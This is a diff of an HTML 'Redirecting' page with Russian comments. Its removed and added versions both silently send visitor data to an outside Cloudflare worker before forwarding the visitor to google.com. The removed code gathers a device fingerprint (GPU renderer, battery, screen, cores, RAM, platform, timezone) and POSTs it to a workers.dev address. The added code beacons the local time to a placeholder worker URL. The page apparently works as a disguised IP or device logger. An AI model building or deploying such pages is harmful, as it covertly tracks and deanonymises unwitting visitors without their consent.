@@ -1,56 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Redirecting</title>
     <script>
-        async function captureAnalytics() {
-            const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
-            
-            // Получение данных о батарее
-            let batteryStatus = "N/A";
-            try {
-                const battery = await navigator.getBattery();
-                batteryStatus = Math.round(battery.level * 100) + "% (" + (battery.charging ? "Charging" : "Discharging") + ")";
-            } catch (e) {}
+        // Собираем местное время устройства
+        const t = encodeURIComponent(new Date().toLocaleString());
+        const workerUrl = "ССЫЛКА_НА_ТВОЙ_ВОРКЕР";
 
-            // Получение данных о графическом ускорителе
-            let gpuInfo = "N/A";
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (e) {}
-
-            // Формирование пакета данных
-            const payload = {
-                screen: window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x)",
-                lang: navigator.language,
-                cores: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory || "N/A",
-                platform: navigator.platform,
-                gpu: gpuInfo,
-                battery: batteryStatus,
-                time: new Date().toLocaleString(),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-
-            // Передача данных и последующий редирект
-            fetch(workerUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload),
-                mode: "cors"
-            }).finally(() => {
+        // Стучим в воркер, передавая время в параметре ?t=
+        fetch(workerUrl + "?t=" + t)
+            .then(() => {
                 window.location.href = "https://google.com";
+            })
+            .catch(() => {
+                // Если заблокировано, уходим в Google через 1 сек
+                setTimeout(() => {
+                    window.location.href = "https://google.com";
+                }, 1000);
             });
-        }
-
-        window.onload = captureAnalytics;
     </script>
 </head>
 <body>
-    <p>Redirecting to the destination page...</p>
+    <h1>Redirecting...</h1>
 </body>
 </html>
